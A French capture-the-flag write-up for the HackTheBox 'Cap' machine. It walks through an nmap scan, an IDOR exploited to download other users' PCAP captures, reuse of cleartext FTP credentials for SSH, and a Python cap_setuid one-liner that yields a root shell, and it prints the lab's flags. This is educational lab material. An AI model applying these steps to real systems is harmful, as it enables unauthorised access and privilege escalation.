# Write-up -- HackTheBox : Cap

Write-up réalisé pour la machine Cap de HackTheBox. L'objectif est d'exploiter une IDOR sur une interface de capture réseau pour récupérer des credentials FTP en clair dans un fichier PCAP, puis d'escalader les privilèges via une Linux capability mal configurée sur Python.

L'IP de la machine pendant ma session était `10.129.39.139`.

---

## 1) How many TCP ports are open?

```bash
nmap -sC -sV -sS 10.129.39.139
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

**3 ports TCP ouverts** : FTP sur le 21, SSH sur le 22, et une application web Python (Gunicorn) sur le 80 intitulée "Security Dashboard".

---

## 2) After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?

On visite le site sur le port 80 et on navigue vers l'onglet **Security Snapshot**. Un clic sur le bouton lance une capture réseau et redirige vers :

```
http://10.129.39.139/data/2
```

La page propose de télécharger un fichier `2.pcap` : le chiffre correspond à l'identifiant de la capture dans l'URL.

**Réponse : `data`**

---

## 3) Are you able to get to other users' scans?

En modifiant manuellement l'identifiant dans l'URL (`/data/1`, `/data/0`, etc.), on obtient des fichiers PCAP différents à chaque fois. Le serveur ne vérifie pas que la capture demandée appartient à l'utilisateur courant : c'est une **IDOR** (Insecure Direct Object Reference).

**Réponse : yes**

---

## 4) What is the ID of the PCAP file that contains sensitive data?
## 5) Which application layer protocol in the pcap file can the sensitive data be found in?

On teste les identifiants un par un. `id=1` ne contient rien d'intéressant. En passant à `id=0` :

```
http://10.129.39.139/data/0
```

On télécharge `0.pcap` et on l'ouvre dans Wireshark. Le fichier contient des échanges **FTP** en clair, incluant une authentification avec des credentials en texte brut :

```
USER nathan
PASS Buck3tH4TF0RM3!
```

FTP ne chiffre pas les communications : identifiants et mots de passe transitent en clair sur le réseau, lisibles dans n'importe quelle capture.

**ID : `0` , Protocole : `FTP`**

---

## 6) We've managed to collect nathan's FTP password. On what other service does this password work?

Le scan nmap avait révélé SSH sur le port 22. On teste la réutilisation du mot de passe :

```bash
ssh nathan@10.129.39.139
# Password: Buck3tH4TF0RM3!
```

La connexion fonctionne.

**Réponse : `SSH`**

---

## 7) Submit the flag located in the nathan user's home directory.

```bash
nathan@cap:~$ cat user.txt
```

**Flag user :** `666565635afa75bffb46ea6bc0d825a1`

---

## 8) What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?

Les **Linux capabilities** permettent d'attribuer à un binaire un sous-ensemble de privilèges root, sans lui donner tous les droits. C'est un mécanisme plus fin que le bit SUID, mais tout aussi dangereux si mal configuré. On liste tous les binaires ayant des capabilities avec `getcap` :

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping      = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

`python3.8` possède la capability **`cap_setuid`** : elle lui permet d'appeler `setuid()` pour changer son UID à l'exécution, y compris pour passer à `uid=0` (root). C'est exactement ce qu'on va exploiter.

**Réponse : `/usr/bin/python3.8`**

---

## 9) Submit the flag located in root's home directory.

On consulte [GTFOBins](https://gtfobins.github.io/) pour la technique d'exploitation via `cap_setuid` sur Python. La commande est simple : on importe `os`, on appelle `setuid(0)` pour devenir root, puis on spawn un shell :

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

```bash
# cat /root/root.txt
b28ab07afce5f58e2fcc0907ed690754
```

**Flag root :** `b28ab07afce5f58e2fcc0907ed690754`
